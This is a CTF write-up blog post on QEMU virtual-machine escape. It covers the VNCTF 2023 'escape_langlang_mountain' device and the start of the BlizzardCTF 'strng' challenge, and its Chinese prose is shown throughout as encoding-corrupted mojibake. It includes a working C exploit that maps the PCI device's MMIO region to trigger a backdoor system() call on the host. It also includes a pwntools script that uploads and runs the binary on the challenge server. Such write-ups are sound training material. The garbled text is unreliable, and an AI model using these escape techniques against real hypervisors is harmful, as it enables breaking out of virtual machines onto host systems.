<h3 id="ä»€ä¹ˆæ˜¯QOMï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯QOMï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯QOMï¼Ÿ"></a>ä»€ä¹ˆæ˜¯QOMï¼Ÿ</h3><p><code>QOM</code>  <code>ï¼ˆQEMU Object Modelï¼‰</code> æ˜¯ <code>QEMU</code> çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œå®ƒæ˜¯ <code>QEMU</code> åœ¨ <code>C</code> çš„åŸºç¡€ä¸Šè‡ªå·±å®ç°äº†ä¸€å¥—é¢å‘å¯¹è±¡æœºåˆ¶ï¼Œæ”¯æŒå¤šç§ä½“ç³»ç»“æ„å’Œè®¾å¤‡ã€‚åœ¨ <code>QOM</code> ä¸­ï¼Œæ¯ä¸ªè®¾å¤‡éƒ½è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡æœ‰ä¸€ä¸ªç±»å‹ï¼Œè¯¥ç±»å‹å®šä¹‰äº†è®¾å¤‡çš„å±æ€§å’Œè¡Œä¸ºã€‚é€šè¿‡ <code>QOM</code>ï¼Œå¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ·»åŠ æ–°çš„è®¾å¤‡å’Œæ‰©å±•ç°æœ‰è®¾å¤‡çš„åŠŸèƒ½ï¼Œä»è€Œä½¿ <code>QEMU</code>å˜å¾—æ›´åŠ å¼ºå¤§å’Œçµæ´»ã€‚</p>
<h2 id="é¢˜ç›®ç»ƒä¹ "><a href="#é¢˜ç›®ç»ƒä¹ " class="headerlink" title="é¢˜ç›®ç»ƒä¹ "></a>é¢˜ç›®ç»ƒä¹ </h2><h3 id="escape-langlang-mountain"><a href="#escape-langlang-mountain" class="headerlink" title="escape_langlang_mountain"></a>escape_langlang_mountain</h3><p>é¢˜ç›®é™„ä»¶åœ¨ <code>buu</code> çš„ <code>vnctf 2023</code> çš„æ¯”èµ›é‡Œå°±æœ‰</p>
<h4 id="ç®€å•åˆ†æ"><a href="#ç®€å•åˆ†æ" class="headerlink" title="ç®€å•åˆ†æ"></a>ç®€å•åˆ†æ</h4><p>ä½œä¸ºä¸€ååˆæ ¼çš„èœé¸¡ï¼Œåˆšå¼€å§‹è¿å’‹å¯åŠ¨ <code>qemu</code> éƒ½ä¸çŸ¥é“ï¼Œè¿™é‡Œæ ‡æ˜ä¸€ä¸‹è¿™ä¿©æ–‡ä»¶ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251623441.png" alt="image-20230225162320163"></p>
<p>å¦‚æœæœ‰ <code>qemu</code> çš„è¯ï¼Œé‚£ä¹ˆç›´æ¥ <code>./launch.sh</code> å°±å¯ä»¥å¯åŠ¨äº†ã€‚å¦‚æœæ²¡æœ‰çš„è¯å°± <code>sudo apt install qemu-system</code> å®‰è£…ä¸€ä¸‹å³å¯ï¼Œå¦‚æœè¿˜è¿è¡Œä¸äº†çš„è¯å°± <code>ldd</code> çœ‹ä¸€ä¸‹æ˜¯ä¸æ˜¯å°‘ä»€ä¹ˆåº“äº†ï¼Œå°‘å“ªä¸ªè£…å“ªä¸ªå°±è¡Œï¼ˆå…·ä½“åšæ³•å¯ä»¥å‚è€ƒæ–‡æœ«çš„ <strong>å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½</strong> éƒ¨åˆ† ï¼‰</p>
<p>é€šè¿‡æŸ¥çœ‹ <code>launch.sh</code> æ–‡ä»¶æˆ‘ä»¬å¯ä»¥çŸ¥é“è®¾å¤‡çš„åç§°å«åš <code>vn</code> ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251629467.png" alt="image-20230225162953416"></p>
<p>æ¥ä¸‹æ¥æ‰“å¼€ <code>ida</code> è¿›è¡Œåˆ†æï¼Œæ­£å¸¸çš„è¯çœ‹åˆ°çš„æ˜¯å¤šåˆ°è®©äººæ‡µé€¼çš„ä»£ç ã€‚</p>
<p>æˆ‘ä»¬çš„æ€è·¯æ˜¯å…ˆå®šä½åˆ° <code>vn_class_init</code> å‡½æ•°ï¼Œå› ä¸ºå»é™¤äº†ç¬¦å·è¡¨ï¼Œæ‰€ä»¥è¿™é‡Œå¾—æ ¹æ®ç‰¹å¾æ¥è¯†åˆ«</p>
<p>æˆ‘è¿™é‡Œå‚è€ƒçš„æ˜¯ <strong>winmt</strong> å¸ˆå‚…ç»™æˆ‘æ¨èçš„ä»£ç   <a target="_blank" rel="noopener" href="https://github.com/qemu/qemu/blob/master/hw/misc/edu.c">QEMU educational PCI device</a> ï¼Œä¸‹é¢æ‰€æåˆ°çš„ç‰¹å¾éƒ½æ˜¯æ ¹æ®å¯¹æ¯”è¿™ä¸ªæ¨¡æ¿æ¥è¿›è¡Œåˆ¤æ–­çš„</p>
<p>æˆ‘ä¸ªäººè®¤ä¸ºè¿™ä¸ª <code>vn_class_init</code> ä¸€ä¸ªæ˜¾è‘—ç‰¹å¾å°±æ˜¯æœ‰å¦‚ä¸‹çš„ <code>id</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251638167.png" alt="image-20230225163814127"></p>
<p>æ‰€ä»¥æˆ‘ä»¬æœç´¢ <code>vn_class_init</code> å­—ç¬¦ä¸²å†ç»“åˆä¸‹é¢è¿™ä¸ªç‰¹å¾æ¥å¯»æ‰¾ <code>vn_class_init</code> å‡½æ•°ï¼Œä»è€Œåˆ¤æ–­å‡ºæ¥ä¸‹é¢è¿™ä¸ªå‡½æ•°å°±æ˜¯ <code>vn_class_init</code> å‡½æ•°ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251640026.png" alt="image-20230225164013977"></p>
<p>æˆ‘ä»¬åœ¨æœ¬åœ°å¯åŠ¨ <code>qemu</code> åï¼Œæ ¹æ® <code>lspci</code> å‘½ä»¤å¾—åˆ°çš„ç»“æœï¼ˆæ¯”å¦‚å‡ºç°çš„ <code>0420</code> å’Œ <code>1337</code> ï¼‰ä¸ä¸Šé¢ <code>vn_class_init</code> å‡½æ•°ä¸­çš„ <code>PCI</code> ä¿¡æ¯æ¯”è¾ƒä¸€ä¸‹å¾—çŸ¥ <code>vn</code> è¿™ä¸ªè®¾å¤‡å·æ˜¯ <code>04</code> ï¼ˆè¿™ä¸ªä¿¡æ¯åœ¨å†™è„šæœ¬çš„æ—¶å€™ä¼šç”¨åˆ°ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251642828.png" alt="image-20230225164210745"></p>
<p>è€Œä¹‹æ‰€ä»¥ä¸Šé¢é‚£é‡Œåˆ¤æ–­ <code>sub_6d9166</code> ä¸º <code>pci_vn_realize</code> æ˜¯å› ä¸ºæ¨¡æ¿ä»£ç ä¸­åœ¨ <code>xxx_class_init</code> å‡½æ•°ä¸­è¿™é‡Œæœ‰å°† <code>pci_xxx_realize</code> çš„å‡½æ•°åœ°å€èµ‹å€¼ç»™ç»“æ„ä½“çš„æˆå‘˜å˜é‡ï¼ˆè¿™äº›æ‰€è°“çš„ç‰¹å¾æ¥åˆ¤æ–­ï¼Œéƒ½æ˜¯æˆ‘è‡ªå·±çš„çŒœæµ‹ï¼Œæ— æ³•ä¿è¯ä¸€å®šæ­£ç¡®ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251754897.png" alt="image-20230225175449806" style="zoom:50%;" />



<p>è¿›å…¥ <code>pci_vn_realize</code> å‡½æ•°ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ç»§ç»­å¯¹æ¯”æ¨¡æ¿ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰ï¼ŒçŒœæµ‹ <code>sub_54ABB5</code> å‡½æ•°æ˜¯ <code>memory_region_init_io</code>  ï¼ŒåŸå› æ˜¯è¿™ä¸ªå‡½æ•°å‡ºç°äº† <code>vn_mmio</code> è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å‚æ•°ä¹Ÿç¬¦åˆ <code>memory_region_init_io</code> çš„ç‰¹å¾ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251758656.png" alt="image-20230225175818596"></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251801455.png" alt="image-20230225180116377" style="zoom:50%;" />

<p>è€Œ <code>memory_region_init</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ˜¯ <code>vn_mmio_ops</code> ï¼Œå®ƒé€šå¸¸æ˜¯ç”¨äºè®¿é—® <code>MMIO</code> å¯„å­˜å™¨çš„å‡½æ•°é›†åˆï¼Œè¿™é‡Œé¢å­˜æ”¾äº† <code>vn_mmio_read</code> å’Œ <code>vn_mmio_write</code> çš„å‡½æ•°æŒ‡é’ˆï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251807914.png" alt="image-20230225180705872"></p>
<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>æˆ‘ä»¬å†æ¥çœ‹ <code>vn_mmio_read</code> å‡½æ•°ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251808609.png" alt="image-20230225180803560" style="zoom:50%;" />

<p>è¿™ä¸ªä»£ç å¾ˆçŸ­ï¼Œå¦‚æœ <code>a2</code> æ»¡è¶³ <code>((a2 &gt;&gt; 20) &amp; 0xF) == 1</code> å’Œ <code>((a2 &gt;&gt; 16) &amp; 0xF) == 0xF</code> ,é‚£ä¹ˆå°±å¯ä»¥å°†å­—ç¬¦ä¸² <code>vnctf</code> å¤åˆ¶åˆ° <code>dword_137A358</code> çš„åœ°å€ä¸Šã€‚è¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯æ¨¡æ‹Ÿäº† <code>mmio_read</code> å‡½æ•°çš„åŠŸèƒ½ï¼Œå³ <code>MMIO</code> è¯»å–æ•°æ®åˆ° <code>qemu</code> æ¨¡æ‹Ÿçš„å†…å­˜é‡Œï¼Œæ‰€ä»¥æœ€åçš„ <code>memcpy</code> å‡½æ•°å°±æ˜¯åœ¨åšè¿™ä¸ªï¼Œè€Œ <code>vnctf</code> å­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯è¦ä» <code>MMIO</code> é‡Œè·å–çš„æ•°æ®ã€‚</p>
<p>å†çœ‹ <code>vn_mmio_write</code> å‡½æ•°ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251820483.png" alt="image-20230225182013429" style="zoom:50%;" />

<p>è¿™é‡Œå‘ç°äº†åé—¨å‡½æ•°ï¼Œå¦‚æœè¦è§¦å‘ <code>system</code> çš„è¯ï¼Œéœ€è¦è®© <code>a2</code> ä¸º <code>0x2f0000</code> ï¼ˆç®€å•ç®—ä¸€ä¸‹å°±è¡Œï¼‰ï¼Œå¦‚æœæƒ³è®© <code>command</code> ä¸º <code>cat flag</code> å­—ç¬¦ä¸²çš„è¯ï¼Œéœ€è¦è®© <code>a2</code> ä¸º <code>0x100000</code> ï¼Œæ‰€ä»¥è¿™ä¸ª <code>vn_mmio_write</code>  è¦æ‰§è¡Œä¸¤æ¬¡ã€‚</p>
<h4 id="EXPçš„ç¼–å†™"><a href="#EXPçš„ç¼–å†™" class="headerlink" title="EXPçš„ç¼–å†™"></a>EXPçš„ç¼–å†™</h4><p>ä¸Šé¢ä¼¼ä¹ä¸€åˆ‡éƒ½é¡ºç†æˆç« ï¼Œä½†æˆ‘ä»¬å¥½åƒå¿˜è®°äº†ï¼Œå¦‚ä½•è°ƒç”¨ <code>vn_mmio_read</code> å’Œ <code>vn_mmio_write</code> å‡½æ•°å¹¶ä¸”æ§åˆ¶ä»–ä»¬çš„å‚æ•°ï¼Ÿ</p>
<p><code>QEMU</code> å®ç° <code>MMIO</code> æ¨¡æ‹Ÿçš„å…¶ä¸­ä¸€ä¸ªå› ç´ å°±æ˜¯<strong>ç›‘æ§è™šæ‹Ÿæœºå¯¹ <code>MMIO</code> å†…å­˜çš„è¯»å†™ï¼Œè§¦å‘å¯¹åº”çš„å›è°ƒå‡½æ•°çš„æ‰§è¡Œ</strong>ã€‚å‡è®¾æˆ‘ç°åœ¨å¯¹ <code>MMIO</code> å†…å­˜è¿›è¡Œäº†è¯»çš„æ“ä½œï¼Œé‚£ä¹ˆ <code>qemu-system-x86_64</code> ç¨‹åºä¸­çš„ <code>vn_mmio_read</code> å›è°ƒå‡½æ•°åˆ™ä¼šè¢«è§¦å‘ï¼Œè€Œå®ƒçš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯»çš„ <code>MMIO</code> åœ°å€ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ª <code>C</code> ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œæ¥å¯¹ <code>MMIO</code> å†…å­˜è¿›è¡Œè¯»çš„æ“ä½œï¼ˆ <code>mmio_mem</code> æ˜¯ <code>MMIO</code> åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼‰ï¼Œä¹‹æ‰€ä»¥è¿™æ®µä»£ç è¿›è¡Œäº†è¯»çš„æ“ä½œæ˜¯å› ä¸º <code>return *(mmio_mem + addr)</code> å°† <code>MMIO</code> åŒºåŸŸä¸­çš„æ•°æ®è¯»äº†å‡ºæ¥å¹¶è¿”å›ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line">mmio_read(<span class="number">0x1f0000</span>);</span><br></pre></td></tr></table></figure>



<p>ä¾æ¬¡ç±»æ¨ <code>mmio_write</code> å‡½æ•°æ˜¯åŒç†ï¼Œå‘ <code>MMIO</code> åŒºåŸŸä¸­å†™å…¥æ•°æ®ï¼Œä»è€Œè§¦å‘å›è°ƒå‡½æ•° <code>vn_mmio_write</code> ï¼Œè¿™é‡Œçš„ <code>value</code> æ— æ‰€è°“ï¼Œè€Œ <code>addr</code> åˆ™ä¼šå½“åšå‚æ•°ä¼ é€’ç»™ <code>vn_mmio_write</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line">mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<p>ä¸ºäº†è·å– <code>MMIO</code> åŒºåŸŸçš„é¦–åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦æ‰“å¼€å…¶è®¾å¤‡çš„ <code>resource0</code> æ–‡ä»¶ï¼Œä½¿ç”¨ <code>mmap</code> å‡½æ•°å°†å…¶æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸Šï¼Œæœ€ç»ˆå®ç°äº†å¯¹ <code>MMIO</code> åŒºåŸŸçš„è®¿é—®ã€‚è¿˜è®°å¾—å‰é¢æ‰€è¯´çš„è®¾å¤‡å· <code>04</code> ä¹ˆï¼Œæ¥ä¸‹æ¥ <code>open</code> çš„æ—¶å€™éœ€è¦ç”¨åˆ°ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â perror(msg);</span><br><span class="line">Â Â <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR</span><br><span class="line">| O_SYNC);</span><br><span class="line">Â Â <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">Â Â Â Â die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line">Â Â mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line">Â Â <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">Â Â Â Â die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">Â Â mmio_read(<span class="number">0x1f0000</span>);</span><br><span class="line">Â Â mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br><span class="line">Â Â mmio_write(<span class="number">0x2f0000</span>, <span class="number">1</span>);</span><br><span class="line">Â </span><br><span class="line">Â Â <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè„šæœ¬æ˜¯ <strong>winmt</strong> å¸ˆå‚…å†™çš„ï¼Œæ•´ä½“æ€è·¯å°±æ˜¯å…ˆè·å– <code>MMIO</code> çš„èµ·å§‹åœ°å€ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡è¯»ï¼Œä¸¤æ¬¡å†™çš„æ“ä½œï¼Œä»¥æ­¤æ¥è§¦å‘å›è°ƒå‡½æ•°ï¼Œæœ€ç»ˆè§¦å‘äº† <code>system(&quot;cat flag&quot;)</code> ã€‚å› ä¸ºè¿™ä¸ª <code>qemu_system</code> ç¨‹åºè¿˜æ˜¯è·‘åœ¨å®¿ä¸»æœºä¸Šçš„ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªç¨‹åºä¸­æ‰§è¡Œ <code>system(&quot;cat flag&quot;)</code> è¯»å–çš„æ˜¯å®¿ä¸»æœºçš„ <code>flag</code> ä»è€Œå®Œæˆçš„é€ƒé€¸ï¼Œè¿™å’Œ <code>glibc</code> çš„é¢˜ç›®è·å– <code>shell</code> å…¶å®ä¸€æ ·ï¼Œä¸è¿‡æœ€åˆæˆ‘ä»¥ä¸ºè¿™ä¸ª <code>qemu_system</code> ç¨‹åºå°±æ˜¯åœ¨ <code>qemu</code> é‡Œé¢ï¼Œæ‰€ä»¥æ‰§è¡Œäº† <code>system</code> ä¹Ÿæ˜¯åœ¨ <code>qemu</code> é‡Œé¢æ‰€æ‰§è¡Œçš„ã€‚ </p>
<p>ä¸Šé¢è¿™ä¸ªè„šæœ¬ç”¨ <code>musl-gcc</code> æ‰€ç¼–è¯‘ä¸ºé™æ€é“¾æ¥çš„ç¨‹åºï¼ˆç”¨ <code>musl-gcc</code> ç¼–è¯‘æ˜¯å› ä¸ºè¿™æ ·ç”Ÿæˆçš„ç¨‹åºä½“ç§¯æ›´å°ï¼Œé™æ€é“¾æ¥çš„ç¨‹åºæ˜¯å› ä¸ºè¿œç¨‹ç¯å¢ƒæœ‰æ—¶å€™æ²¡æœ‰åŠ¨æ€é“¾æ¥åº“ï¼‰</p>
<p>ç¼–è¯‘å‘½ä»¤ä¸º <code>musl-gcc exp.c -o exp -static</code> <strong>ï¼ˆ <code>musl-gcc</code> çš„ç¼–è¯‘ä¸é…ç½®å†™åˆ°äº†æ–‡æœ« å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½ éƒ¨åˆ†ï¼‰</strong></p>
<p>å¦‚æœæ‰“è¿œç¨‹çš„è¯ï¼Œåˆ™éœ€è¦ä½¿ç”¨ä¸Šä¼ è„šæœ¬ï¼ˆå¦‚ä¸‹ï¼Œè¿™ä¾ç„¶æ˜¯ <strong>winmt</strong> å¸ˆå‚…æ‰€ç¼–å†™çš„ï¼‰</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25692</span>)</span><br><span class="line">os.system(<span class="string">&quot;gzip -c ./exp &gt; ./exp.gz&quot;</span>)<span class="comment">#å°†cè„šæœ¬ç¼–è¯‘å¹¶å‘½åä¸º exp</span></span><br><span class="line">os.system(<span class="string">&quot;base64 ./exp.gz &gt; ./b64_exp&quot;</span>)</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">content = fd.read()</span><br><span class="line">length = <span class="built_in">len</span>(content)</span><br><span class="line">fd.close()</span><br><span class="line">per_length = <span class="number">0x200</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, per_length) :</span><br><span class="line">	cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : i + per_length] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line"><span class="keyword">if</span> length - i &gt; <span class="number">0</span> :</span><br><span class="line">	cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : length + <span class="number">1</span>] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;base64 -d ./b64_exp &gt; ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;gunzip ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;chmod +x ./exp&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261430662.png" alt="image-20230226143001990" style="zoom:50%;" />



<h3 id="strng"><a href="#strng" class="headerlink" title="strng"></a>strng</h3><p>è¿™ä¸ªçš„é¢˜ç›®é“¾æ¥åœ¨ <a target="_blank" rel="noopener" href="https://github.com/rcvalle/blizzardctf2017/releases">è¿™é‡Œ</a></p>
<p>ç„¶åå¯åŠ¨è„šæœ¬ç”¨è¿™ä¸ª ï¼Œè‡ªå·±åˆ›å»ºä¸€ä¸ª <code>launch.sh</code> æ–‡ä»¶å°±è¡Œï¼ˆé€šè¿‡è¿™ä¸ªå¯åŠ¨è„šæœ¬å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªè®¾å¤‡åå«åš <code>strng</code>ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨ä¹‹åï¼Œå‘ç°è¿™æ¨¡æ‹Ÿçš„æ˜¯ä¸€ä¸ª <code>ubuntu</code> è™šæ‹Ÿæœºï¼Œç„¶åç™»å½•çš„ç”¨æˆ·åæ˜¯ <code>ubuntu</code> ï¼Œ å¯†ç æ˜¯ <code>passw0rd</code> ã€‚</p>
<h4 id="ä»£ç é€†å‘"><a href="#ä»£ç é€†å‘" class="headerlink" title="ä»£ç é€†å‘"></a>ä»£ç é€†å‘</h4><p>è¿™ä¸ª <code>qemu-system-x86_64</code> æ²¡æœ‰å»é™¤ç¬¦å·è¡¨ï¼Œä½†æ˜¯å¼€äº† <code>PIE</code> ã€‚æˆ‘ä»¬çš„é€†å‘æ€è·¯æ˜¯å»æœç´¢å‡½æ•°åä¸­å­˜åœ¨ <code>strng</code> å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œè¿™æ ·å¯ä»¥æ›´å¿«å®šä½åˆ°å…³é”®å‡½æ•°ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011317071.png" alt="image-20230301131745963" style="zoom:50%;" />



<p>æˆ‘ä»¬ä» <code>strng_class_init</code> å‡½æ•°å…¥æ‰‹åˆ†æï¼ˆå¦‚ä¸‹ï¼‰ï¼Œæ ¹æ®è¿™é‡Œçš„æ•°æ®å¯ä»¥åˆ†æå‡ºæ¥è®¾å¤‡å·</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011318907.png" alt="image-20230301131847811" style="zoom:50%;" />



<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011329170.png" alt="image-20230301132945008" style="zoom:50%;" />

<p>å¦‚ä¸Šï¼Œå¯ä»¥çŸ¥é“ <code>strng</code> çš„è®¾å¤‡ä¸º <code>00:03:0</code></p>
<p>ç„¶åæ¥ä¾æ¬¡åˆ†æ <code>strng_mmio_read</code>  <code>strng_mmio_write</code> <code>strng_pmio_read</code> <code>strng_pmio_write</code> è¿™å››ä¸ªå‡½æ•°ï¼Œåœ¨åˆ†æä¹‹å‰ï¼Œéœ€è¦æŠŠè¿™å››ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° <code>opaque</code> çš„ç±»å‹æ”¹ä¸º <code>STRNGState *</code> ï¼Œè¿™æ ·å¯ä»¥è®© <code>ida</code> è¯†åˆ«å‡ºæ¥è¿™ä¸ªç»“æ„ä½“ï¼Œè‡³äºä¸ºä»€ä¹ˆè¿™é‡Œè¦ä¿®æ”¹æˆ <code>STRNGState *</code>  ç±»å‹ï¼Œä¸ªäººçŒœæµ‹å¯èƒ½è¿™ä¸ªä½ç½®æ­£å¸¸çš„å‚æ•°ç±»å‹å°±æ˜¯ <code>xxxState *</code> ï¼ˆ <code>xxx</code> æ˜¯è®¾å¤‡åï¼‰</p>
<p> <code>STRNGState</code> çš„ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure>





<p><code>strng_mmio_read</code> å‡½æ•°ä¸­å¦‚æœæ»¡è¶³ <code>if</code> çš„è¯å°±è¿”å› <code>regs</code> æ•°ç»„é‡Œçš„å€¼ï¼Œ </p>
